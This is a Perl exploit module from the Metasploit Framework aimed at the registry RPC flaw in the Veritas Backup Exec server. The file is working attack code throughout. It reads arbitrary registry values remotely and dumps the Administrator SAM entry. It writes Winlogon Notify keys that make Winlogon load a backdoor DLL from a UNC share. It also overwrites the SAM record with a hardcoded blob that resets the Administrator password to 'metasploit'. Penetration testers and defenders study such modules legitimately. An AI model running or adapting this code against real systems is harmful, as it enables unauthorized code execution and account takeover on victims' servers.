
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::backupexec_registry;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use Pex::DCERPC;
use Pex::BEServerRPC;

my $advanced = { };

my $info =
  {
	'Name'  	=> 'Veritas Backup Exec Server Registry Access',
	'Version'  	=> '$Revision$',
	'Authors' 	=> [ 'H D Moore <hdm [at] metasploit.com>' ],
	'Arch'  	=> [ ],
	'OS'    	=> [ ],

	'UserOpts'	=>
	  {
		'RHOST'  => [1, 'ADDR', 'The target address'],
		'RPORT'  => [1, 'PORT', 'The target port', 6106],
		'UNCDLL' => [0, 'DATA', 'The UNC path to the target DLL'],
		'HIVE'   => [0, 'DATA', 'The hive name to read (HKLM, HKCU, etc)', 'HKLM'],
		'SUBKEY' => [0, 'DATA', 'The full path to the registry subkey' ],
		'SUBVAL' => [0, 'DATA', 'The name of the subkey value to read' ],
	  },


	'Description'  => Pex::Text::Freeform(qq{
		This modules exploits a remote registry flaw in the BackupExec Windows
	Server RPC service. 
	
	Please see the target list for the different attack modes.
}),

	'Refs' =>
	  [
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
			['Display System Information',                     'INFO' ],
			['Read Arbitrary Registry Path',                   'READ' ],
			['Load DLL over UNC path via Winlogon', 'WINLOGON_ATTACK' ],
			['Fix Winlogon registry after DLL load', 'WINLOGON_CLEAR' ],
			['Reset Administrator password to "metasploit"', 'ADMIN_RESET' ],
	  ],

	'Keys' => ['veritas'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');	
	
	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return $self->CheckCode('Connect');
	}	
	
	my ($bind, $ctx) = Pex::DCERPC::BindFakeMulti (
		Pex::DCERPC::UUID_to_Bin('93841fd0-16ce-11ce-850d-02608c44967b'),
		'1.0',
	);
	
	$s->Send($bind);
	
	my $rpc = Pex::DCERPC::ReadResponse($s);
	if (! $rpc) {
		$s->Close;
		$self->PrintLine('[*] Unknown response received from the server');
		return $self->CheckCode('Unknown');
	}
	
	# Generate the RPC request packets
	my @pkts = Pex::DCERPC::Request (
		7, 
		Pex::BEServerRPC::RegEnum(''),
		256,
		$ctx
	);
	
	# Send each fragment of the request
	foreach (@pkts) { $s->Send($_) }
	
	# Read the response packet
	$rpc = Pex::DCERPC::ReadResponse($s);
	$s->Close;
	
	# Remove the NULLs to make matching easier
	my $raw = $rpc->{'StubData'};
	$raw =~ s/\x00//g;
	
	# Look for the HKLM\Software and HKLM\Hardware keys
	if ($raw =~ /SOFTWARE/i && $raw =~/HARDWARE/i) {
		$self->PrintLine("[*] This system appears to be vulnerable");
		return $self->CheckCode('Confirmed');
	}

	$self->PrintLine("[*] This system does not appear to be vulnerable");
	return $self->CheckCode('Safe');
}

sub HiveMap {
	my $self = shift;
	my $hive = shift;
	my %hmap =
	(
		'HKCR' => 0x80000000,
		'HKCU' => 0x80000001,
		'HKLM' => 0x80000002,
		'HKU'  => 0x80000003,
		'HKPD' => 0x80000004,
		'HKCC' => 0x80000005,
		'HKDD' => 0x80000006,
	);
	
	return $hmap{$hive} if exists($hmap{$hive});

	$self->PrintLine("[*] Invalid hive name. Options: ".join(", ", keys %hmap));
	return;
}


sub Exploit {
	my $self        = shift;
	my $target_idx  = $self->GetVar('TARGET');
	my $target      = $self->Targets->[$target_idx];

	if ($target->[1] eq 'INFO') {
		return $self->DumpInfo();
	}
	
	if ($target->[1] eq 'READ') {
		return $self->ReadRegistry();
	}

	if ($target->[1] eq 'WINLOGON_ATTACK') {
		return $self->WinlogonDLLAttack();
	}
	
	if ($target->[1] eq 'WINLOGON_CLEAR') {
		return $self->WinlogonDLLClear();
	}	

	if ($target->[1] eq 'ADMIN_RESET') {
		return $self->AdminPassReset();
	}	
}

sub DumpInfo {
	my $self = shift;
	
	my $user = $self->RegReadString(
		0x80000001,  # HKCU 
		'Software\Microsoft\Windows\CurrentVersion\Explorer',
		'Logon User Name'
	);
	
	if ($user) {
		$self->PrintLine("[*] Desktop User: $user");
	}
	else {
		$self->PrintLine("[*] Nobody is currently logged in");
	}

	return;
}

sub ReadRegistry {
	my $self = shift;
	my $skey = $self->GetVar('SUBKEY');
	my $sval = $self->GetVar('SUBVAL');
	my $hive = $self->HiveMap($self->GetVar('HIVE'));
	return if ! $hive;
	
	my $data = $self->RegReadString($hive, $skey, $sval);
	return if ! $data;
	
	$self->PrintLine("[*] DATA: '$data'");
	return;
}

##
# HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\metasploit
#   DWORD   Asynchronous   0
#   DWORD   Impersonate    0
#   DWORD   MaxWait        600
#   DWORD   Safe           1
# 
#   SZ      DLLName        \\host\share\owned.dll
#
#   SZ      Lock, Logon, Logoff, Shutdown, StartScreenSaver, StartShell, Startup, 
#           StopScreenSaver, Unlock, PostShell

sub WinlogonDLLAttack {
	my $self = shift;
	my $udll = $self->GetVar('UNCDLL');
	my $hive = $self->HiveMap('HKLM');
	
	if ($udll !~ /^\\\\.+\\.+\\.+/) {
		$self->PrintLine("[*] Invalid UNC: $udll");
		$self->PrintLine("[*] Example: \\\\10.10.10.10\\Share\\MyBackdoorDLL.dll");
		return;
	}
	
	# REG_DWORD = 4
	# REG_SZ    = 1
	
	my $notify = 'Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\metasploit';
	
	# Step 1. Create (reset) the DLLName key to an empty string
	if (! $self->RegWriteString( $hive, $notify, 'DLLName', '', 1) ) {
		$self->PrintLine('[*] Failed to write the initial registry entry');
		return;
	}
	
	# Step 2. Create entries for Asynchronous and Impersonate
	if (! $self->RegWriteString( $hive, $notify, 'Impersonate', pack('V', 0), 4) ) {
		$self->PrintLine('[*] Failed to write the Impersonate subkey value');
		return;
	}	
	if (! $self->RegWriteString( $hive, $notify, 'Asynchronous', pack('V', 1), 4) ) {
		$self->PrintLine('[*] Failed to write the Asynchronous subkey value');
		return;
	}

	
	# Step 3. Write the exported function name to the event keys
	my @events = 
	(
		'Lock',
		'Logon',
		'Logoff',
		'Shutdown',
		'StartScreenSaver',
		'StartShell',
		'Startup',
		'StopScreenSaver',
		'Unlock',
		'PostShell',
		'Disconnect',
		'Reconnect',
	);
	
	foreach my $event (@events) {
		if (! $self->RegWriteString( $hive, $notify, $event, 'EventHandler', 1) ) {
			$self->PrintLine("[*] Failed to write the event key for $event");
			return;
		}
	}
	
	# Step 4. Set the DLLName key to our UNC path
	if (! $self->RegWriteString( $hive, $notify, 'DLLName', $udll, 1) ) {
		$self->PrintLine('[*] Failed to write the UNC path to DLLName');
		return;
	}
	
	$self->PrintLine('[*] Winlogon will now load and execute the DLL at the next event');
	return;
}

sub WinlogonDLLClear {
	my $self = shift;
	my $hive = $self->HiveMap('HKLM');
	
	my $notify = 'Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\metasploit';
	
	if (! $self->RegWriteString( $hive, $notify, 'DLLName', '', 1) ) {
		$self->PrintLine('[*] Failed to write an empty DLLName to the notify subkey');
		return;
	}
	$self->PrintLine('[*] The DLLName value has been replaced with an empty string');
	return;
}

sub AdminPassReset {
	my $self = shift;
	my $hive = $self->HiveMap('HKLM');
	my $subkey = 'SAM\SAM\Domains\Account\Users\000001F4';
	
	my $data = $self->RegReadString($hive, $subkey, 'V');
	if (! $data) {
		$self->PrintLine('[*] Could not access the SAM key in the remote registry');
		return;
	}
	
	$self->PrintLine('[*] Dumping the SAM entry for the administrator account...');
	$self->PrintLine(Pex::Text::BufferPerl($data));
	$self->PrintLine('');

	my $admin_metasploit =
		"\x00\x00\x00\x00\xa8\x00\x00\x00\x02\x00\x01\x00\xa8\x00\x00\x00".
		"\x1a\x00\x00\x00\x00\x00\x00\x00\xc4\x00\x00\x00\x00\x00\x00\x00".
		"\x00\x00\x00\x00\xc4\x00\x00\x00\x6c\x00\x00\x00\x00\x00\x00\x00".
		"\x30\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x30\x01\x00\x00".
		"\x00\x00\x00\x00\x00\x00\x00\x00\x30\x01\x00\x00\x00\x00\x00\x00".
		"\x00\x00\x00\x00\x30\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
		"\x30\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x30\x01\x00\x00".
		"\x00\x00\x00\x00\x00\x00\x00\x00\x30\x01\x00\x00\x00\x00\x00\x00".
		"\x00\x00\x00\x00\x30\x01\x00\x00\x15\x00\x00\x00\xa8\x00\x00\x00".
		"\x48\x01\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x50\x01\x00\x00".
		"\x14\x00\x00\x00\x00\x00\x00\x00\x64\x01\x00\x00\x14\x00\x00\x00".
		"\x00\x00\x00\x00\x78\x01\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00".
		"\x7c\x01\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x14\x80".
		"\x88\x00\x00\x00\x98\x00\x00\x00\x14\x00\x00\x00\x30\x00\x00\x00".
		"\x02\x00\x1c\x00\x01\x00\x00\x00\x02\xc0\x14\x00\x44\x00\x05\x01".
		"\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x02\x00\x58\x00".
		"\x03\x00\x00\x00\x00\x00\x14\x00\x5b\x03\x02\x00\x01\x01\x00\x00".
		"\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x18\x00\xff\x07\x0f\x00".
		"\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00".
		"\x00\x00\x24\x00\x44\x00\x02\x00\x01\x05\x00\x00\x00\x00\x00\x05".
		"\x15\x00\x00\x00\xd1\xda\x74\x03\xff\x13\x98\x15\x43\x17\x0a\x32".
		"\xf4\x01\x00\x00\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00".
		"\x20\x02\x00\x00\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00".
		"\x20\x02\x00\x00\x41\x00\x64\x00\x6d\x00\x69\x00\x6e\x00\x69\x00".
		"\x73\x00\x74\x00\x72\x00\x61\x00\x74\x00\x6f\x00\x72\x00\x00\x00".
		"\x42\x00\x75\x00\x69\x00\x6c\x00\x74\x00\x2d\x00\x69\x00\x6e\x00".
		"\x20\x00\x61\x00\x63\x00\x63\x00\x6f\x00\x75\x00\x6e\x00\x74\x00".
		"\x20\x00\x66\x00\x6f\x00\x72\x00\x20\x00\x61\x00\x64\x00\x6d\x00".
		"\x69\x00\x6e\x00\x69\x00\x73\x00\x74\x00\x65\x00\x72\x00\x69\x00".
		"\x6e\x00\x67\x00\x20\x00\x74\x00\x68\x00\x65\x00\x20\x00\x63\x00".
		"\x6f\x00\x6d\x00\x70\x00\x75\x00\x74\x00\x65\x00\x72\x00\x2f\x00".
		"\x64\x00\x6f\x00\x6d\x00\x61\x00\x69\x00\x6e\x00\xff\xff\xff\xff".
		"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
		"\xff\xc5\xea\x06\x01\x02\x00\x00\x07\x00\x00\x00\x01\x00\x01\x00".
		"\x9a\x72\xb0\x56\x39\x91\x5d\x37\xb9\x3a\x77\xea\xdb\x52\x50\x2e".
		"\x01\x00\x01\x00\x9e\x1f\x36\xa8\x88\xb5\xfc\x3a\x67\x98\xd1\xcf".
		"\x63\x44\x8b\x6a\x01\x00\x01\x00\x01\x00\x01\x00";

	$self->PrintLine('[*] Resetting the administrator password to "metasploit"...');
	if (! $self->RegWriteString( $hive, $subkey, 'V', $admin_metasploit, 3) ) {
		$self->PrintLine("[*] Failed to write the new Administrator profile");
		return;
	}

	$self->PrintLine('[*] Password should now be reset :-)');
	return;
}

sub RegReadString {
	my $self = shift;
	my $hive = shift;
	my $path = shift;
	my $sval = shift;

	my ($s, $ctx) = $self->ConnectAndBind();
	return if ! $s || ! $ctx;
	
	# Generate the RPC request packets
	my @pkts = Pex::DCERPC::Request (
		4, 
		Pex::BEServerRPC::RegRead(
			'SubKey' => $path,
			'SubVal' => $sval,
			'Hive'   => $hive,
		),
		256,
		$ctx
	);
	
	# Send each fragment of the request
	foreach (@pkts) { $s->Send($_) }
	
	# Read the response packet
	my $rpc = Pex::DCERPC::ReadResponse($s);
	$s->Close;
	
	my ($ret, $len) = unpack('V*', $rpc->{'StubData'});
	if ($ret != 1 && $ret != 3) {
		return;
	}
	
	my $raw = substr($rpc->{'StubData'}, 8, $len);
	return $raw;
}

sub RegWriteString {
	my $self = shift;
	my $hive = shift;
	my $path = shift;
	my $skey = shift;
	my $sval = shift;
	my $type = shift;

	my ($s, $ctx) = $self->ConnectAndBind();
	return if ! $s || ! $ctx;

	# Generate the RPC request packets
	my @pkts = Pex::DCERPC::Request (
		5, 
		Pex::BEServerRPC::RegWrite(
			'SubKey' => $path,
			'SubVal' => $skey,
			'Hive'   => $hive,
			'Data'   => $sval,
			'Type'   => $type,
		),
		256,
		$ctx
	);
	
	# Send each fragment of the request
	foreach (@pkts) { $s->Send($_) }
	
	# Read the response packet
	my $rpc = Pex::DCERPC::ReadResponse($s);
	$s->Close;
	if (! $rpc->{'StubData'}) {
		return;
	}
	
	# print "response: ".unpack("H*", $rpc->{'StubData'})."\n";
	return 1;
}

sub ConnectAndBind {
	my $self = shift;
	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $self->GetVar('RHOST'),
		'PeerPort'  => $self->GetVar('RPORT'),
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return;
	}

	my ($bind, $ctx) = Pex::DCERPC::BindFakeMulti (
		Pex::DCERPC::UUID_to_Bin('93841fd0-16ce-11ce-850d-02608c44967b'),
		'1.0',
	);
	
	$s->Send($bind);
	
	my $rpc = Pex::DCERPC::ReadResponse($s);
	if (! $rpc) {
		$s->Close;
		$self->PrintLine('[*] Unknown response received from the server');
		return;
	}
	
	return ($s, $ctx);
}

1;

__END__
"\x00\x00\x00\x00\xa8\x00\x00\x00\x02\x00\x01\x00\xa8\x00\x00\x00".
"\x1a\x00\x00\x00\x00\x00\x00\x00\xc4\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\xc4\x00\x00\x00\x6c\x00\x00\x00\x00\x00\x00\x00".
"\x30\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x30\x01\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x30\x01\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x30\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x30\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x30\x01\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x30\x01\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x30\x01\x00\x00\x15\x00\x00\x00\xa8\x00\x00\x00".
"\x48\x01\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x50\x01\x00\x00".
"\x14\x00\x00\x00\x00\x00\x00\x00\x64\x01\x00\x00\x14\x00\x00\x00".
"\x00\x00\x00\x00\x78\x01\x00\x00\x24\x00\x00\x00\x00\x00\x00\x00".
"\x9c\x01\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x01\x00\x14\x80".
"\x88\x00\x00\x00\x98\x00\x00\x00\x14\x00\x00\x00\x30\x00\x00\x00".
"\x02\x00\x1c\x00\x01\x00\x00\x00\x02\xc0\x14\x00\x44\x00\x05\x01".
"\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x02\x00\x58\x00".
"\x03\x00\x00\x00\x00\x00\x14\x00\x5b\x03\x02\x00\x01\x01\x00\x00".
"\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x18\x00\xff\x07\x0f\x00".
"\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00".
"\x00\x00\x24\x00\x44\x00\x02\x00\x01\x05\x00\x00\x00\x00\x00\x05".
"\x15\x00\x00\x00\x3d\xe3\x08\x4d\x26\xed\xaa\x4f\x23\x5f\x63\x6b".
"\xf4\x01\x00\x00\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00".
"\x20\x02\x00\x00\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00".
"\x20\x02\x00\x00\x41\x00\x64\x00\x6d\x00\x69\x00\x6e\x00\x69\x00".
"\x73\x00\x74\x00\x72\x00\x61\x00\x74\x00\x6f\x00\x72\x00\x00\x00".
"\x42\x00\x75\x00\x69\x00\x6c\x00\x74\x00\x2d\x00\x69\x00\x6e\x00".
"\x20\x00\x61\x00\x63\x00\x63\x00\x6f\x00\x75\x00\x6e\x00\x74\x00".
"\x20\x00\x66\x00\x6f\x00\x72\x00\x20\x00\x61\x00\x64\x00\x6d\x00".
"\x69\x00\x6e\x00\x69\x00\x73\x00\x74\x00\x65\x00\x72\x00\x69\x00".
"\x6e\x00\x67\x00\x20\x00\x74\x00\x68\x00\x65\x00\x20\x00\x63\x00".
"\x6f\x00\x6d\x00\x70\x00\x75\x00\x74\x00\x65\x00\x72\x00\x2f\x00".
"\x64\x00\x6f\x00\x6d\x00\x61\x00\x69\x00\x6e\x00\xff\xff\xff\xff".
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
"\xff\x2b\xfb\x70\x01\x02\x00\x00\x07\x00\x00\x00\x01\x00\x01\x00".
"\x24\xda\x28\xb6\xa7\x15\x6f\xdc\x70\x5e\xa9\xde\xe9\x9f\x86\xd7".
"\x01\x00\x01\x00\x80\x92\x55\xc5\xb9\xc1\x9e\x14\x9a\x0a\xe6\x51".
"\x0d\x5f\xf1\xb7\x01\x00\x01\x00\x59\xc8\x0a\x7c\x66\x24\x2c\xbd".
"\x96\x0a\x89\x9d\xb5\x85\xc0\x61\x3e\x68\x25\x00\x83\x18\x62\xd7".
"\x6f\xa0\x54\xd5\xa6\xed\x2c\x37\x01\x00\x01\x00\x58\x84\x5f\x33".
"\x9f\x56\x39\x69\xdf\x66\x29\x58\xd2\xf7\xf0\xcc";
